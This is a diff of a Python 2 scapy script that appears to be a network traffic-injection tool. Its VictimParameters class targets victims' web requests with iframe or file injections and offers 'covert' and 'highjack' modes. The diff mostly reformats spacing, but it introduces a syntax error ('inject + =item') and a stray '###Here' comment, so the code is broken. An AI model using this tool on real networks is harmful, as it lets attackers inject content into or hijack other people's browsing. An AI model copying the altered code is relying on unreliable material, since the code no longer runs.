@@ -1,22 +1,22 @@
 from threading import Thread
 from Queue import Queue, Empty
 from scapy.all import *
-import gzip,time,binascii,sys,fcntl,socket,struct
+import gzip, time, binascii, sys, fcntl, socket, struct
 
 global BLOCK_HOSTS
 global npackets
-npackets=0
-BLOCK_HOSTS=set()
+npackets = 0
+BLOCK_HOSTS = set()
 
 class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
+	HEADER = '\033[95m'
+	OKBLUE = '\033[94m'
+	OKGREEN = '\033[92m'
+	WARNING = '\033[93m'
+	FAIL = '\033[91m'
+	ENDC = '\033[0m'
+	BOLD = '\033[1m'
+	UNDERLINE = '\033[4m'
 
 '''
 VictimParameters class
@@ -27,70 +27,78 @@ For targeted mode, this is a property of Victim.
 For broadcast mode, this is a property of PacketHandler
 '''
 class VictimParameters:
-
-	def __init__(self,*positional_parameters, **keyword_parameters):
+	def __init__(self, *positional_parameters, **keyword_parameters):
 		if ('websites' in keyword_parameters):
-			self.websites=keyword_parameters['websites']
+			self.websites = keyword_parameters['websites']
 		else:
-			self.websites=None
+			self.websites = None
+
 		if ('inject_file' in keyword_parameters):
-			self.inject_file=keyword_parameters['inject_file']
+			self.inject_file = keyword_parameters['inject_file']
 		else:
-			self.inject_file=None
+			self.inject_file = None
 
 		if ('in_request' in keyword_parameters):
-			self.in_request=keyword_parameters['in_request']
+			self.in_request = keyword_parameters['in_request']
 		else:
-			self.in_request=None
+			self.in_request = None
+
 		if ('covert' in keyword_parameters):
-			self.covert=keyword_parameters['covert']
+			self.covert = keyword_parameters['covert']
 		else:
-			self.covert=False
+			self.covert = False
+
 		if ('in_request_handler' in keyword_parameters):
-			self.in_request_handler=keyword_parameters['in_request_handler']
+			self.in_request_handler = keyword_parameters['in_request_handler']
 		else:
-			self.in_request_handler=None
+			self.in_request_handler = None
+
 		if ('highjack' in keyword_parameters):
-			self.highjack=keyword_parameters['highjack']
+			self.highjack = keyword_parameters['highjack']
 		else:
-			self.highjack=None
+			self.highjack = None
+
 		if (self.websites is None and self.inject_file is None and self.in_request is None):
 			print "[ERROR] Please specify victim parameters"
 			exit(1)
+
 		if (self.in_request is not None and (self.websites is None and self.inject_file is None)):
 			print "[ERROR] You must select websites or an inject file for use with in_request"
 		else:
 			if (self.websites is not None):
-				self.website_injects=[]
+				self.website_injects = []
 				for website in self.websites:
-					self.website_injects.append((website,self.get_iframe(website,"0")))
+					self.website_injects.append((website,self.get_iframe(website, "0")))
+
 			if (self.inject_file is not None):
-				self.file_inject=self.load_injection(self.inject_file)
-				self.file_injected=0
+				self.file_inject = self.load_injection(self.inject_file)
+				self.file_injected = 0
+
 	'''
 	Default request handler,
 	just checks if in_request string
 	is contained in the request
 	(i.e. in_request="Firefox")
 	'''
-	def default_request_handler(self,request):
+	def default_request_handler(self, request):
 		if (self.in_request in request):
 			return True
 		else:
 			return False
+
 	'''
 	Generate hex string in packit format
 	from injection string
 	'''
-	def hex_injection(self,injection):
-		k=binascii.hexlify(injection)
-		n=2
-		inject="0x"
+	def hex_injection(self, injection):
+		k = binascii.hexlify(injection)
+		n = 2
+		inject = "0x"
 		for item in [k[i:i+n] for i in range(0, len(k), n)]:
-			inject+=item+" "
+			inject + =item+" "
 		return inject
 
-
+###Here
 	'''
 	Process request, send it to custom
 	handler if set, otherwise use default
